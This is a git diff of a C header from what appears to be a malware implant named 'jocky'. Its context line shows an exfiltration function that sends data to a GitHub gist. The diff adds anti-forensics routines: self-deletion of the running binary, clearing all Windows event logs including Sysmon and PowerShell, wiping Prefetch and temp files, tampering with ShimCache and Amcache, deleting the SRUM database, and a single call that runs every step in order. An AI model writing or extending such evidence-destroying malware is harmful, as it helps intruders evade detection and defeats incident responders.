@@ -335,17 +335,43 @@ bool jocky_exfil_github(const char* token, const char* gist_id,
 #endif /* _WIN32 (exfiltration) */
 
 /* ============================================================================
- * Cleanup: Self-Deletion, Log Clearing, Anti-Forensics
+ * Cleanup: Anti-Forensics  *(Windows unless noted)*
  * ============================================================================ */
 
-/* Delete the running executable from disk (Windows: pending rename, Linux: unlink) */
+/* Delete the running executable using POSIX-semantics unlink (Win10+),
+ * rename+delete-on-close (Win7+), or MoveFileEx reboot-delete as fallbacks.
+ * Linux: unlinks /proc/self/exe immediately. */
 bool jocky_self_delete(void);
 
-/* Clear system event logs */
+/* Clear every Windows event log channel via EvtClearLog (all channels
+ * including Sysmon, PowerShell, WMI-Activity).  Also clears legacy logs via
+ * ClearEventLog.  Linux: journalctl vacuum + wtmp/lastlog truncate. */
 bool jocky_clear_logs(void);
 
-/* Wipe Prefetch / cache artifacts */
+/* Delete Prefetch .pf files, Recent shortcuts, and %TEMP% contents.
+ * Uses Win32 file APIs — no child processes spawned. */
 bool jocky_wipe_artifacts(void);
+
+/* Delete all .pf files from %SystemRoot%\Prefetch. */
+bool jocky_wipe_prefetch(void);
+
+/* Delete the AppCompatCache registry value and flush the in-memory ShimCache
+ * via the undocumented BaseFlushAppcompatCache() kernel32 export. */
+bool jocky_patch_shimcache(void);
+
+/* Load Amcache.hve as a temporary registry hive (requires SeBackupPrivilege
+ * + SeRestorePrivilege), delete all entries whose path matches the current
+ * executable, then unload the hive. */
+bool jocky_patch_amcache(void);
+
+/* Stop the SRUM service (svsvc), delete SRUDB.dat so Windows recreates it
+ * empty, then restart the service.  Schedules deletion on next boot if the
+ * file cannot be deleted immediately. */
+bool jocky_clear_srum(void);
+
+/* Run all cleanup steps in order: clear logs → wipe prefetch → patch ShimCache
+ * → patch Amcache → clear SRUM → wipe artifacts → self-delete. */
+bool jocky_cleanup_all(void);
 
 /* ============================================================================
  * Crypto: String / Data Decryption
